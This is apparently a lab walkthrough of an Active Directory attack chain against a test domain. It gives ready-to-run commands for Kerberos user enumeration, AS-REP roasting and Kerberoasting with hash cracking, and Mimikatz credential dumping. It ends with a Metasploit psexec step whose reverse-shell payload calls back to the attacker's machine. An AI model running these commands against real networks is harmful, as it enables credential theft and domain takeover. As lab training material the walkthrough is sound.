
## Understanding Key Terms

| Term | What it means |
| --- | --- |
| Domain Controller (DC) | The brain of the network. Controls all logins |
| testlab.local | The domain name — like a company network name |
| Domain Admin | Highest privilege group in the domain |
| SYSTEM | Highest privilege on a single local machine |
| SPN | Service Principal Name — marks service accounts |
| TGT | Ticket Granting Ticket — Kerberos login proof |
| TGS | Ticket Granting Service — access to specific service |

### Step - 1 : DC Discovery with Nmap

```bash
nmap -p 88,389,445,3268 192.168.10.0/24
nmap -sV --script=ldap* 192.168.10.19
```

**What to look for:**

- Port 88 = Kerberos = Domain Controller
- Port 389 = LDAP = Active Directory
- Port 3268 = Global Catalog

!image.png

!image.png

<aside>
💡

When you run `--script="ldap*"`, Nmap will display the results grouped under each specific script's name in your terminal. If the server is secure, it may only report basic server details. If it is misconfigured, it may spit out a massive list of domain usernames and system details.

</aside>

### Step - 2: Setting Up Active Directory (Lab Setup)

#### **On Windows Server 2012:**

1. Install AD DS role via Server Manager
2. Promote to Domain Controller
3. Set domain name: testlab.local
4. Set static IP: 192.168.10.19
5. Create vulnerable user accounts

#### **Creating AS-REP Roastable user:**

- Create user: testuser
- Open AD Users and Computers
- Right click testuser → Properties → Account tab
- Check: "Do not require Kerberos preauthentication"

#### **Creating Kerberoastable user:**

```bash
net user sqlservice Password123! /add /domain

setspn -S MSSQLSvc/sqlservice.testlab.local:1433 testlab\sqlservice
```

!image.png

!image.png

#### **Join Windows 7 to domain:**

- Computer → Properties → Change Settings
- Domain: testlab.local
- Use Administrator credentials

!image.png

#### Enumerate users with Kerbrute

```bash
kerbrute userenum  --dc 192.168.10.19  --domain testlab.local /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
```

**Also try different wordlist’s , to get better result’s**

!image.png

### Step - 3 : AS-REP Roasting

<aside>
💡

**What it is:** Targets users with Kerberos pre-authentication disabled. Anyone can request their hash without a password. Hash cracked offline.

</aside>

```bash
# From Parrot OS
GetNPUsers.py testlab.local/testuser -dc-ip 192.168.10.19 -no-pass -request

OR 

/usr/local/bin/GetNPUsers.py testlab.local/testuser -dc-ip 192.168.10.19 -no-pass -request > testuser_hash.txt
```

#### **Save the hash to file:**

```bash
GetNPUsers.py testlab.local/testuser -dc-ip 192.168.10.19 -no-pass -request -outputfile asrep_hash.txt
```

!image.png

#### **Crack with Hashcat:**

```bash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

!image.png

**Custom wordlist if rockyou fails:**

```bash
cat rockyou.txt > custom.txt
echo "YourGuessedPassword" >> custom.txt
hashcat -m 18200 asrep_hash.txt custom.txt
```

<aside>
💡

**Key lesson:**
rockyou.txt may not contain the password.
Build custom wordlist based on target info.

</aside>

### Step - 4 : Kerberoasting

**What it is:**
Targets service accounts with SPNs registered.
Need valid credentials first. Request TGS ticket,
crack offline. Different from AS-REP — needs auth.

```bash
# List all SPNs in domain
impacket-GetUserSPNs testlab.local/testuser:Password -dc-ip 192.168.10.19

# Request and save ticket
impacket-GetUserSPNs testlab.local/testuser:Password -dc-ip 192.168.10.19 -request -outputfile kerberoast_hash.txt
```

<aside>
💡

Use **`GetNPUsers.py`** (No Password) for AS-REP Roasting first, then use **`GetUserSPNs.py`** (Service Password Needed) for Kerberoasting after you get credentials.

</aside>

!image.png

#### **Crack with Hashcat:**

```bash
hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt --force
```

!image.png

**Hashcat modes reference:**

| Mode | Attack |
| --- | --- |
| 18200 | AS-REP Roasting |
| 13100 | Kerberoasting |
| 1000 | NTLM hash |

### Step - 5 : Credential Dumping with Mimikatz/Kiwi

**Requires:** SYSTEM level access on target

```bash
# Inside Meterpreter session
load kiwi
creds_all          # dump everything
creds_wdigest      # cleartext passwords
lsa_dump_sam       # NTLM hashes from SAM
creds_msv          # MSV provider hashes
```

**Why WDigest gives cleartext:**
Windows 7 stores credentials in memory in
plaintext via WDigest provider. Disabled by
default on Windows 8.1+. Enabled by default
on older systems.

**Result from our lab:**
Successfully recovered Domain Administrator
cleartext credentials from LSASS memory.

!Load_Kiwi.png

### Step - 6 :  Lateral Movement to Domain Controller

 **1 — Validate credentials with NetExec:**

```bash
nxc smb 192.168.10.19 -u Administrator -p 'YourPassword' -d TESTLAB
```

**Look for:** `Pwn3d!` = you have admin access

!image.png

 **2 — Get shell on DC with PsExec:**

```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.10.19
set SMBUser Administrator
set SMBPass YourPassword
set SMBDomain TESTLAB
set payload windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_PARROT_IP
set LPORT 7777
exploit
```

**Confirm Domain Controller compromise:**

```bash
getuid          # NT AUTHORITY\SYSTEM
sysinfo         # shows DC01 hostname
```

!image.png

# Full Attack Chain Summary
